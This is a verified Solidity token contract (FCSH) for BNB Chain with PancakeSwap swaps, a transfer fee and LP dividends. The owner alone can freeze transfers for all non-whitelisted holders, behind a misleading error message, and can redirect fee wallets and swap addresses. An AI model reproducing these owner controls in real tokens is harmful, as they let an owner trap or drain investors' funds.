/**
 *Submitted for verification at BscScan.com on 2023-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract FCSH is Ownable, IERC20Metadata {
    mapping(address => bool) public _buyed;
    mapping(address => bool) public _whites;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 public _maxsell;
    uint256 public _marks;
    uint256 public _index;
    address public _router;
    address public _fist;
    address public _wrap;
    uint256   public _done;
    address public _main;
    address public _pair;
    address public _dead;
    address public _mark2;
    address[] public lpfhsz;
    bool public kaipan;
    address public _wraps;
    address public _goumai;
    bool   private _swapping;
    constructor() {
        _name = "facaishu";
        _symbol = "FCSH";
        _marks = 6;
        _done = 5;
        _maxsell = 100000000 * 10 ** decimals();
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0xef039F21782E965C72E15EFcA89690Bed55F9303;
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[address(this)] = true;
        _mint(_main, 21000000000000 * 10 ** decimals());
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        if(!_whites[sender]){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        if (!_buyed[sender] && recipient == _pair && !isContract(sender)) {
            _buyed[sender] = true;
            lpfhsz.push(sender);
        }
        if (!_swapping && !isContract(sender)) {
            _swapping = true;
            _swap1();
            _swapping = false;
        }
        if (!_whites[sender] && !_whites[recipient] && (isContract(recipient)||isContract(sender))){
            _balances[address(this)] += (amount * (_marks) / 100);
            emit Transfer(sender, address(this), (amount * (_marks) / 100));
            amount = amount * (100 - _marks) / 100;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }       
    function _swap1() private {
        uint256 balances = balanceOf(address(this));
        if (_maxsell > 0 && balances >= _maxsell) {
            _swapTokenForFist((balances)*57/60);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                IERC20(_fist).transfer(_mark2, (fistval2)*36 / 57);
                IERC20(address(this)).transfer(_dead, (balances)*2 / 60);
                if (balances/60 > 0 && (fistval2)*1/57 > 0) {
                addLiquidity2(balances/60, (fistval2)*1/57);
            _swapTokenForFist1((fistval2)*20 / 57);
                uint256 fistval3 = IERC20(_goumai).balanceOf(address(this));
                _doBonusFist (fistval3);
                }
        }
    }
    function addLiquidity2(uint256 t1, uint256 t2) private {
        IPancakeRouter02(_router).addLiquidity(address(this), 
            _fist, t1, t2, 0, 0, _dead, block.timestamp);
    }
    function _doBonusFist(uint256 amount) private {
        uint256 buySize = lpfhsz.length;
        uint256 i = _index;
        uint256 done = 0;
        IERC20 lp = IERC20(_pair);
        while(i < buySize && done < _done ) {
            address user = lpfhsz[i];
            if(lp.balanceOf(user) >= 0) {
                uint256 bonus = lp.balanceOf(user) * amount / lp.totalSupply();
                if (bonus > 0) {
                    IERC20(_goumai).transfer(user, bonus);
                    done ++;
                }
            }
            i ++;
        }
        if (i == buySize) {i = 0;}
        _index = i;
    }
    function _swapTokenForFist(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _fist;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _wrap, block.timestamp);
        uint256 amount = IERC20(_fist).balanceOf(_wrap);
        if (IERC20(_fist).allowance(_wrap, address(this)) >= amount && amount > 0) {
            IERC20(_fist).transferFrom(_wrap, address(this), amount);
        }
    }
    function _swapTokenForFist1(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = _goumai;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _wraps, block.timestamp);
        uint256 amount = IERC20(_goumai).balanceOf(_wraps);
        if (IERC20(_goumai).allowance(_wraps, address(this)) >= amount && amount > 0) {
            IERC20(_goumai).transferFrom(_wraps, address(this), amount);
        }
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    receive() external payable {}
    function markg(address mark2) public onlyOwner {
        _mark2 = mark2;
    }
    function setWhites(address addr, bool val) public onlyOwner {
        _whites[addr] = val;
    }
    function sell(uint256 hd) public onlyOwner {
        _maxsell = hd;
    }
    function KP(bool val) public onlyOwner {
        kaipan = val;
    }
    function SQ() public  {
        IERC20(_fist).approve(_router, 9 * 10**70);
        IERC20(_goumai).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);
    }

    function setRouter(address router, address fist, address wrap,address wraps,address goumai1,address pair) public onlyOwner {
        _fist = fist;
        _wrap = wrap;
        _wraps = wraps;
        _router = router;
        _goumai = goumai1;
        _whites[router] = true;
        IERC20(_fist).approve(_router, 9 * 10**70);
        IERC20(_goumai).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);
         if (pair == address(0)) {
            IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
            _pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _fist);
        } else {
            _pair = pair;
        }

    }
}